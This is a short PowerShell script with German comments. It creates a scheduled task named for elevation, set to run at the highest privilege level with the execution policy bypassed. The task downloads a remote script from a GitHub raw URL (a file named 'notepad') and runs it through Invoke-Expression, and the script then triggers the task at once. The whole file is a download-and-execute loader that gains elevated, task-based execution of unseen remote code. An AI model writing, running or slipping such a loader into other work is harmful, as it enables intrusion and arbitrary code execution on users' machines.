$scriptUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/notepad"
$taskName = "MeinErhöhterTask"
$taskCommand = "powershell.exe -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri '$scriptUrl' -UseBasicParsing | Invoke-Expression`""

# Geplante Aufgabe erstellen
schtasks /create /tn $taskName /tr $taskCommand /sc once /st 00:00 /rl highest /f | Out-Null

# Aufgabe sofort ausführen
schtasks /run /tn $taskName
